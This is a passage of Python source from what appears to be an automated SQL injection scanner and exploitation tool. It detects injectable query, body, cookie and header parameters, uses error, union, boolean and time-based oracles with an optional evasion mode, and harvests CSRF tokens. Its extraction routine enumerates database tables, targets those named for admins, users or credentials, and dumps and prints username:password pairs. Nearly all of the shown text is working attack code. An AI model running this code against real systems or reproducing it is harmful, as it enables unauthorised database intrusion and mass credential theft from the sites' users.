            wrapped = _wrap_sentinel_oracle("'oracle-mark'", a, b)

        payload = wrap(spec["payload_template"].format(wrapped_expr=wrapped))
        r = await _send(session, point, limiter, jar,
                        raw_payload=payload, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if r is None:
            continue
        value = _parse_between_sentinels(r[2], a, b)
        if value:
            if verbose:
                info(f"error oracle usable: {name} (leaked {value[:40]!r})")
            return name

    return None


async def error_extract(session, point, wrap, limiter, func_name, sql_query,
                        dbms, jar=None, label="data", verbose=False,
                        evade=False, baseline_len=None):
    funcs = _error_funcs_for(dbms)
    if func_name not in funcs:
        return ""
    spec = funcs[func_name]

    if dbms == "mysql":
        marker = spec["marker"]
        if not spec["windowed"]:
            d = _dialect(dbms)
            wrapped = d["group_concat"](f"({sql_query})")
            payload = wrap(spec["payload"].format(expr=wrapped))
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                return ""
            value = _parse_error_value_mysql(r[2], marker)
            if verbose and value:
                info(f"  {label} (error/{func_name}): {value[:60]!r}")
            return value

        info(f"extracting {label} via error/{func_name} "
             f"({ERROR_WINDOW}B windows)...")
        out = []
        pos = 1
        started = time.monotonic()
        max_windows = (MAX_EXTRACT_CHARS // ERROR_WINDOW) + 2
        prev_chunk = None
        for _ in range(max_windows):
            if time.monotonic() - started > MAX_EXTRACT_SECONDS:
                warn(f"{label!r} exceeded time budget; aborting at byte {pos}")
                break
            window_expr = f"SELECT substring(({sql_query}),{pos},{ERROR_WINDOW})"
            payload = wrap(spec["payload"].format(expr=window_expr))
            r = await _send(session, point, limiter, jar,
                            raw_payload=payload, evade=evade,
                            baseline_len=baseline_len, verbose=verbose,
                            dbms=dbms)
            if r is None:
                break
            chunk = _parse_error_value_mysql(r[2], marker)
            if not chunk:
                break
            if chunk == prev_chunk and len(chunk) >= ERROR_WINDOW:
                if verbose:
                    warn(f"  {label}: window {pos} repeated; aborting")
                break
            prev_chunk = chunk
            out.append(chunk)
            if verbose:
                info(f"  {label}: window {pos}: {chunk!r}")
            if len(chunk) < ERROR_WINDOW:
                break
            pos += ERROR_WINDOW
        value = "".join(out)
        if verbose and value:
            info(f"  {label} (error/{func_name}): {value[:60]!r}")
        return value

    window = max(40, spec.get("truncate_len", 200) - 20)
    info(f"extracting {label} via error/{func_name} ({window}B windows)...")

    out = []
    pos = 1
    started = time.monotonic()
    max_windows = (MAX_EXTRACT_CHARS // window) + 2
    prev_chunk = None

    for _ in range(max_windows):
        if time.monotonic() - started > MAX_EXTRACT_SECONDS:
            warn(f"{label!r} exceeded time budget; aborting at byte {pos}")
            break

        a = "zzqA" + secrets.token_hex(3)
        b = "zzqB" + secrets.token_hex(3)
        window_expr = f"SELECT substring(({sql_query}),{pos},{window})"
        if dbms == "mssql":
            wrapped = _wrap_sentinel_mssql(window_expr, a, b)
        else:
            wrapped = _wrap_sentinel_oracle(window_expr, a, b)

        payload = wrap(spec["payload_template"].format(wrapped_expr=wrapped))
        r = await _send(session, point, limiter, jar,
                        raw_payload=payload, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if r is None:
            break
        chunk = _parse_between_sentinels(r[2], a, b)
        if not chunk:
            break
        if chunk == prev_chunk and len(chunk) >= window:
            if verbose:
                warn(f"  {label}: window {pos} repeated; aborting")
            break
        prev_chunk = chunk
        out.append(chunk)
        if verbose:
            info(f"  {label}: window {pos}: {chunk!r}")
        if len(chunk) < window:
            break
        pos += window

    value = "".join(out)
    if verbose and value:
        info(f"  {label} (error/{func_name}): {value[:60]!r}")
    return value


# ---------------------------------------------------------------------
# Stacked query detection
# ---------------------------------------------------------------------

async def detect_stacked(session, point, wrap, limiter, dbms, jar=None,
                         verbose=False, evade=False, baseline_len=None):
    if dbms not in ("mysql", "mssql"):
        return False

    base = await _send(session, point, limiter, jar,
                       raw_payload=wrap("1=1"), evade=evade,
                       baseline_len=baseline_len, verbose=verbose,
                       dbms=dbms)
    if base is None:
        return False
    base_hash = _hash(base[2])

    benign = await _send(session, point, limiter, jar,
                         raw_payload=wrap("1=1") + "; SELECT 1",
                         evade=evade, baseline_len=baseline_len,
                         verbose=verbose, dbms=dbms)
    if benign is None:
        return False

    if dbms == "mysql":
        failing_payload = wrap("1=1") + "; SELECT extractvalue(1,concat(0x7e,'x'))"
    else:
        failing_payload = wrap("1=1") + "; SELECT 1/0"
    failing = await _send(session, point, limiter, jar,
                          raw_payload=failing_payload, evade=evade,
                          baseline_len=baseline_len, verbose=verbose,
                          dbms=dbms)
    if failing is None:
        return False

    benign_same = _hash(benign[2]) == base_hash
    failing_differs = _hash(failing[2]) != base_hash

    ok = benign_same and failing_differs
    if verbose:
        info(f"stacked for {point.name!r}: "
             f"benign_same={benign_same} failing_differs={failing_differs} "
             f"=> {ok}")
    return ok


# ---------------------------------------------------------------------
# Blind extraction
# ---------------------------------------------------------------------

async def _hash_probe(session, point, wrap, cond, limiter, jar=None,
                      evade=False, baseline_len=None, verbose=False,
                      dbms=None):
    r = await _send(session, point, limiter, jar,
                    raw_payload=wrap(cond), evade=evade,
                    baseline_len=baseline_len, verbose=verbose, dbms=dbms)
    if r is None:
        return None
    return _hash(r[2]), r[3]


async def check_hash_condition(session, point, wrap, cond, limiter,
                               true_hash, jar=None, evade=False,
                               baseline_len=None, verbose=False, dbms=None):
    r = await _hash_probe(session, point, wrap, cond, limiter, jar, evade,
                          baseline_len, verbose, dbms)
    return None if r is None else r[0] == true_hash


async def check_time_condition(session, point, wrap, cond, limiter,
                               dbms, baseline, jar=None, evade=False,
                               baseline_len=None, verbose=False):
    d = _dialect(dbms)
    if d["sleep"] is None:
        return None
    sleep_expr = d["sleep"](TIME_ORACLE_SLEEP)
    combined = f"({cond}) AND ({sleep_expr})"
    r = await _send(session, point, limiter, jar,
                    raw_payload=wrap(combined), evade=evade,
                    baseline_len=baseline_len, verbose=verbose, dbms=dbms)
    return None if r is None else (r[3] - baseline) >= TIME_ORACLE_MIN_DELTA


async def extract_sql_data(session, point, wrap, limiter, oracle_kind,
                           oracle_state, sql_query, dbms, jar=None,
                           label="data", verbose=False, evade=False,
                           baseline_len=None):
    d = _dialect(dbms)
    info(f"extracting {label} via {point.name!r} "
         f"[blind/{oracle_kind}, {dbms}]...")
    extracted = ""
    started = time.monotonic()

    for char_pos in range(1, MAX_EXTRACT_CHARS + 1):
        if time.monotonic() - started > MAX_EXTRACT_SECONDS:
            warn(f"{label!r} exceeded time budget "
                 f"({MAX_EXTRACT_SECONDS}s); aborting at char {char_pos}")
            break

        if char_pos > 1 and char_pos % ORACLE_REVALIDATE_EVERY == 1:
            # FIX 9: re-validate based on the *actual* oracle kind.
            if oracle_kind == "hash":
                t = await _hash_probe(session, point, wrap, "1=1", limiter, jar,
                                      evade, baseline_len, verbose, dbms)
                f = await _hash_probe(session, point, wrap, "1=2", limiter, jar,
                                      evade, baseline_len, verbose, dbms)
                if t is None or f is None or t[0] == f[0]:
                    warn(f"oracle lost during {label!r} at char {char_pos}")
                    break
                oracle_state["true_hash"] = t[0]
            else:
                base = await _send(session, point, limiter, jar,
                                   raw_payload=None, evade=False,
                                   baseline_len=baseline_len, verbose=verbose)
                if base is None:
                    warn(f"baseline lost during {label!r} at char {char_pos}")
                    break
                oracle_state["baseline"] = base[3]

        ascii_expr = d["ascii"](d["substring"](sql_query, char_pos))
        null_cond = f"{ascii_expr} IS NULL"
        if oracle_kind == "hash":
            nr = await check_hash_condition(session, point, wrap, null_cond,
                                            limiter, oracle_state["true_hash"],
                                            jar, evade, baseline_len, verbose,
                                            dbms)
        else:
            nr = await check_time_condition(session, point, wrap, null_cond,
                                            limiter, dbms,
                                            oracle_state["baseline"], jar,
                                            evade, baseline_len, verbose)
        if nr is None:
            warn(f"transport failure during {label!r} NULL probe")
            break
        if nr:
            break

        low, high = 32, 126
        aborted = False
        while low <= high:
            mid = (low + high) // 2
            cond = f"{ascii_expr}>{mid}"
            if oracle_kind == "hash":
                r = await check_hash_condition(session, point, wrap, cond,
                                               limiter,
                                               oracle_state["true_hash"], jar,
                                               evade, baseline_len, verbose,
                                               dbms)
            else:
                r = await check_time_condition(session, point, wrap, cond,
                                               limiter, dbms,
                                               oracle_state["baseline"], jar,
                                               evade, baseline_len, verbose)
            if r is None:
                aborted = True
                break
            if r:
                low = mid + 1
            else:
                high = mid - 1
        if aborted:
            break
        if low < 32 or low > 126:
            break
        extracted += chr(low)
        if verbose:
            info(f"  {label}: {extracted!r}")
    return extracted


# ---------------------------------------------------------------------
# Error-based detection (payload-level)
# ---------------------------------------------------------------------

async def test_payload_task(session, point, payload, limiter, base_errors, sem,
                            jar=None, evade=False, baseline_len=None,
                            verbose=False, dbms=None):
    async with sem:
        r = await _send(session, point, limiter, jar,
                        raw_payload=payload, evade=evade,
                        baseline_len=baseline_len, verbose=verbose,
                        dbms=dbms)
        if r is None:
            return None
        status, _, body, _, mutation = r
        match = contains_sql_error(body)
        if match and match not in base_errors:
            finding = {
                "type": "sqli", "severity": "high", "url": point.url,
                "parameter": point.name, "injection_kind": point.kind,
                "method": point.method, "payload": payload,
                "http_status": status,
                "dbms": ERROR_SIGNATURES.get(match, "generic"),
                "evidence": f"SQL error signature matched: {match!r}",
            }
            if mutation != "identity":
                finding["mutation_used"] = mutation
            return finding
        return None


# ---------------------------------------------------------------------
# Paginated extraction
# ---------------------------------------------------------------------

# FIX 10: return a truncation flag alongside the results.
async def _paginate_extract(extract_fn, query_template, dbms,
                            label, verbose=False):
    results = []
    truncated = False
    for page in range(MAX_PAGES):
        offset = page * PAGE_SIZE
        query = query_template.format(offset=offset, limit=PAGE_SIZE)
        chunk = await extract_fn(query, f"{label} [p{page}]")
        if not chunk:
            break
        items = [x for x in chunk.split(GC_SEP) if x]
        if not items:
            break
        results.extend(items)
        if len(items) < PAGE_SIZE:
            break
    else:
        truncated = True
        warn(f"{label!r} hit MAX_PAGES ({MAX_PAGES} x {PAGE_SIZE} rows); "
             f"result is likely truncated")
    return results, truncated


# ---------------------------------------------------------------------
# Asset orchestration
# ---------------------------------------------------------------------

async def extract_vulnerable_database_assets(session, point, limiter,
                                             dbms, jar=None, verbose=False,
                                             allow_stacked=True,
                                             evade=False, baseline_len=None,
                                             baseline_hash=None):
    d = _dialect(dbms)
    assets = {}
    point = InjectionPoint(
        point.kind, point.name, point.url, point.method,
        dict(point.headers), point.body, point.content_type,
        point.cookies, dbms,
    )

    if await detect_reflection(session, point, limiter, jar, verbose,
                               evade, baseline_len, baseline_hash):
        assets["reflection_suspected"] = True

    ctx_name, wrap, oracle_kind, oracle_state = await detect_context(
        session, point, limiter, dbms, jar=jar, verbose=verbose,
        evade=evade, baseline_len=baseline_len)
    if ctx_name is None:
        assets["oracle_opaque"] = True
        return assets
    info(f"context: {ctx_name} (oracle={oracle_kind})")

    base_r = await _send(session, point, limiter, jar, raw_payload=None,
                         evade=False, baseline_len=baseline_len,
                         verbose=verbose, dbms=dbms)
    baseline_body = base_r[2] if base_r else ""

    n_cols, printable_idx = await detect_union(
        session, point, ctx_name, limiter, dbms, baseline_body,
        jar=jar, verbose=verbose, evade=evade, baseline_len=baseline_len)

    union_ok = False
    if n_cols is not None:
        test = await union_extract(session, point, ctx_name, limiter,
                                   n_cols, printable_idx, d["version"], dbms,
                                   jar=jar, label="union probe",
                                   verbose=verbose, evade=evade,
                                   baseline_len=baseline_len)
        if test and len(test) >= 2:
            union_ok = True
        else:
            if verbose:
                warn("union probe returned <2 bytes; disabling union path")
            n_cols, printable_idx = None, None

    err_func = None
    if dbms in ("mysql", "mssql", "oracle"):
        err_func = await detect_error_oracle(
            session, point, wrap, limiter, dbms, jar=jar, verbose=verbose,
            evade=evade, baseline_len=baseline_len)
        if err_func:
            assets["error_oracle"] = err_func

    async def extract(query, label):
        if union_ok:
            val = await union_extract(session, point, ctx_name, limiter,
                                      n_cols, printable_idx, query, dbms,
                                      jar=jar, label=label, verbose=verbose,
                                      evade=evade, baseline_len=baseline_len)
            if val and len(val) >= 2:
                return val
            if verbose:
                warn(f"{label}: union returned short value, trying error")
        if err_func:
            val = await error_extract(session, point, wrap, limiter,
                                      err_func, query, dbms,
                                      jar=jar, label=label, verbose=verbose,
                                      evade=evade, baseline_len=baseline_len)
            if val:
                return val
            if verbose:
                warn(f"{label}: error oracle returned empty, falling back to blind")
        return await extract_sql_data(session, point, wrap, limiter,
                                      oracle_kind, oracle_state,
                                      query, dbms, jar=jar, label=label,
                                      verbose=verbose, evade=evade,
                                      baseline_len=baseline_len)

    banner = await extract(d["version"], "DB Banner")
    if banner:
        assets["db_version"] = banner
        success(f"DB Banner: {banner}")

    tables, tables_truncated = await _paginate_extract(
        extract, d["tables_page_query"], dbms, "Tables", verbose=verbose)
    assets["tables_truncated"] = tables_truncated
    if not tables:
        return assets
    assets["tables"] = tables
    success(f"Tables ({len(tables)}): {', '.join(tables[:8])}"
            + ("..." if len(tables) > 8 else ""))

    target = next((t for t in tables
                   if any(k in t.lower() for k in
                          ("admin", "user", "account", "credential",
                           "staff", "member", "pass"))), None)
    if not target:
        return assets

    cols_raw = await extract(d["columns_query"](d["str_escape"](target)),
                             f"Columns of {target}")
    columns = [c for c in cols_raw.split(GC_SEP) if c] if cols_raw else []
    assets["target_table_columns"] = columns

    user_col = next((c for c in columns
                     if any(k in c.lower()
                            for k in ("user", "login", "email", "name"))), None)
    pass_col = next((c for c in columns
                     if any(k in c.lower()
                            for k in ("pass", "pwd", "secret", "hash"))), None)
    if not (user_col and pass_col):
        return assets

    ident_t = _ident(target, d)
    ident_u = _ident(user_col, d)
    ident_p = _ident(pass_col, d)
    concat_expr = d["concat"]([ident_u, "':'", ident_p])

    if dbms == "mysql":
        cred_page_template = (
            f"SELECT group_concat(c SEPARATOR 0x1f) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"LIMIT {{limit}} OFFSET {{offset}}) x")
    elif dbms == "postgres":
        cred_page_template = (
            f"SELECT string_agg(c, chr(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"LIMIT {{limit}} OFFSET {{offset}}) x")
    elif dbms == "mssql":
        cred_page_template = (
            f"SELECT string_agg(c, char(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"ORDER BY {ident_u} "
            f"OFFSET {{offset}} ROWS FETCH NEXT {{limit}} ROWS ONLY) x")
    elif dbms == "sqlite":
        cred_page_template = (
            f"SELECT group_concat(c, char(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"LIMIT {{limit}} OFFSET {{offset}}) x")
    else:
        cred_page_template = (
            f"SELECT listagg(c, chr(31)) FROM ("
            f"SELECT {concat_expr} AS c FROM {ident_t} "
            f"ORDER BY {ident_u} "
            f"OFFSET {{offset}} ROWS FETCH NEXT {{limit}} ROWS ONLY) x")

    creds, creds_truncated = await _paginate_extract(
        extract, cred_page_template, dbms, "Credentials", verbose=verbose)
    assets["credentials_truncated"] = creds_truncated
    if creds:
        assets["credentials"] = creds
        success(f"Credentials ({len(creds)})")
        for c in creds:
            success(f"  {c}")

    if allow_stacked:
        assets["stacked_supported"] = await detect_stacked(
            session, point, wrap, limiter, dbms, jar=jar, verbose=verbose,
            evade=evade, baseline_len=baseline_len)

    return assets


# ---------------------------------------------------------------------
# Main runner
# ---------------------------------------------------------------------

def _normalize_cookies(cookies):
    if cookies is None:
        return None
    if isinstance(cookies, str):
        return parse_cookie_string(cookies)
    return cookies


async def test_url(url, session, rate_limiter, cookies=None, verbose=False,
                   auto_extract=True, include_headers=False,
                   method="GET", body=None, content_type=None,
                   allow_stacked=True, evade=False):
    if not url:
        return []

    cookies = _normalize_cookies(cookies)
    limiter = AdaptiveLimiter(rate_limiter)
    jar = TokenJar()

    try:
        base = await _send(session,
                           InjectionPoint("query", "", url, method,
                                          cookies=cookies, body=body,
                                          content_type=content_type),
                           limiter, jar, raw_payload=None)
    except Exception as e:
        if verbose:
            warn(f"baseline fetch failed: {type(e).__name__}: {e!r}")
        return []
    if base is None:
        return []

    baseline_len = len(base[2]) if base[2] else None
    baseline_hash = _hash(base[2]) if base[2] else None

    found = find_tokens(base[2], base[1])
    if found:
        jar.update(found)
        if verbose:
            info(f"csrf: cached {len(found)} token(s) from baseline: "
                 f"{', '.join(found.keys())}")
    else:
        seed_point = InjectionPoint("query", "", url, method,
                                    cookies=cookies, body=body,
                                    content_type=content_type)
        await refresh_tokens(session, seed_point, jar, limiter, verbose=verbose)

    base_errors = set()
    low = base[2].lower()
    for sig in ERROR_SIGNATURES:
        if sig in low:
            base_errors.add(sig)

    points = []
    parsed = urlparse(url)
    for name in parse_qs(parsed.query, keep_blank_values=True).keys():
        points.append(InjectionPoint("query", name, url, method,
                                     cookies=cookies, body=body,
                                     content_type=content_type))
    if body:
        ct = (content_type or "").lower()
        if "json" in ct:
            try:
                obj = _json.loads(body)
                if isinstance(obj, dict):
                    for name in obj:
                        points.append(InjectionPoint("body", name, url, method,
                                                     cookies=cookies, body=body,
                                                     content_type=content_type))
            except Exception:
                pass
        else:
            for name in parse_qs(body, keep_blank_values=True).keys():
                points.append(InjectionPoint("body", name, url, method,
                                             cookies=cookies, body=body,
                                             content_type=content_type))
    if cookies:
        for cname in cookies:
            points.append(InjectionPoint("cookie", cname, url, method,
                                         cookies=cookies, body=body,
                                         content_type=content_type))
    if include_headers:
        for h in ("X-Forwarded-For", "Referer", "X-Real-IP"):
            points.append(InjectionPoint("header", h, url, method,
                                         headers={h: "probe"}, cookies=cookies,
                                         body=body, content_type=content_type))

    if not points:
        return []

    sem = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    tasks = [test_payload_task(session, p, payload, limiter, base_errors, sem,
                               jar=jar, evade=evade,
                               baseline_len=baseline_len, verbose=verbose)
             for p in points for payload in PAYLOADS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    findings, seen, vuln = [], set(), {}
    for r in results:
        if isinstance(r, Exception) or not r:
            continue
        k = (r["injection_kind"], r["parameter"])
        if k in seen:
            continue
        seen.add(k)
        findings.append(r)
        vuln.setdefault((r["injection_kind"], r["parameter"]), r)
        if verbose:
            mut = f" (mut={r['mutation_used']})" if "mutation_used" in r else ""
            success(f"SQLi candidate: {r['injection_kind']} "
                    f"{r['parameter']!r}{mut}")

    # Boolean / time oracle pass for endpoints that leak no errors.
    if auto_extract:
        for p in points:
            if (p.kind, p.name) in vuln:
                continue
            ctx_name, _wrap, oracle_kind, _state = await detect_context(
                session, p, limiter, DEFAULT_DIALECT, jar=jar,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if ctx_name is None:
                continue
            finding = {
                "type": "sqli", "severity": "high",
                "url": p.url, "parameter": p.name,
                "injection_kind": p.kind, "method": p.method,
                "payload": f"context={ctx_name}",
                "http_status": 200,
                "dbms": DEFAULT_DIALECT,
                "evidence": f"blind oracle: context={ctx_name} kind={oracle_kind}",
            }
            findings.append(finding)
            vuln[(p.kind, p.name)] = finding
            if verbose:
                success(f"blind SQLi candidate: {p.kind} {p.name!r} "
                        f"(context={ctx_name})")

    if auto_extract and vuln:
        for (kind, name), sample in vuln.items():
            point = next(p for p in points if p.kind == kind and p.name == name)
            dbms = sample.get("dbms") or DEFAULT_DIALECT
            if dbms == "generic":
                dbms = DEFAULT_DIALECT
            for f in findings:
                if f["injection_kind"] == kind and f["parameter"] == name:
                    f["extraction_attempted"] = True
            try:
                assets = await extract_vulnerable_database_assets(
                    session, point, limiter, dbms, jar=jar, verbose=verbose,
                    allow_stacked=allow_stacked, evade=evade,
                    baseline_len=baseline_len, baseline_hash=baseline_hash)
                for f in findings:
                    if f["injection_kind"] == kind and f["parameter"] == name:
                        if assets:
                            f["extracted_data"] = assets
                        else:
                            f["extraction_failed"] = True
            except Exception as e:
                warn(f"extraction failed for {kind}:{name!r}: "
                     f"{type(e).__name__}: {e!r}")
                for f in findings:
                    if f["injection_kind"] == kind and f["parameter"] == name:
                        f["extraction_error"] = f"{type(e).__name__}: {e}"

    # Suppress findings that errored but produced no oracle: they were
    # probably collateral (e.g. a sibling parameter on the same query).
    findings = [
        f for f in findings
        if not (f.get("extraction_attempted")
                and not f.get("extracted_data")
                and f.get("type") != "csrf_tokens")
    ]

    if jar:
        findings.append({
            "type": "csrf_tokens",
            "note": "tokens were cached during the scan",
            "tokens": sorted(jar.tokens.keys()),
        })

    return findings